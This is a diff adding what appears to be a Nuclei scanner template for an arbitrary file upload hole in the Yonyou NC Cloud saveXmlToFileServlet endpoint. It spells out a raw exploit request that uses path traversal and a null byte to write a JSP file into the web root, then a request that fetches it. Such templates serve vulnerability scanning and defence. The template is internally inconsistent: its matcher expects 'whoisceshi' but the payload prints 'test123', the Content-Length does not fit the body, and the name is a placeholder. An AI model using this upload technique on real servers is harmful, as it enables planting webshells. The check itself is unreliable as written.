@@ -1,0 +1,44 @@
+id: yonyou-nc-saveXmlToFileServlet-upload
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: 用友NC Cloud大型企业数字化平台,深度应用新一代数字智能技术,完全基于云原生架构,打造开放、互联、融合、智能的一体化云平台,聚焦数智化管理、数智化经营、数智化商业等三大企业数智化转型战略方针。用友NC
+    doPost接口存在任意文件上传漏洞。
+  reference:
+    - https://mp.weixin.qq.com/s/nApK5Hx3v0KGeFv4YnpT_w
+  tags: yonyou
+variables:
+  filename: "{{rand_base(6)}}"
+  
+http:
+  - raw:
+      - |-
+        POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..%5C..%5C..%5Cwebapps%5Cnc_web%5C{{filename}}.jsp%00 HTTP/1.1
+        User-Agent: Apache-HttpClient/5.2.1 (Java/1.8.0_202)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Cookie: LA_K1=langid
+        serverEnable: localserver
+        Content-Type: application/octet-stream
+        Content-Encoding: UTF_8
+        Content-Length: 9
+
+        <% out.println("test123");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      - |+
+        GET /{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - whoisceshi
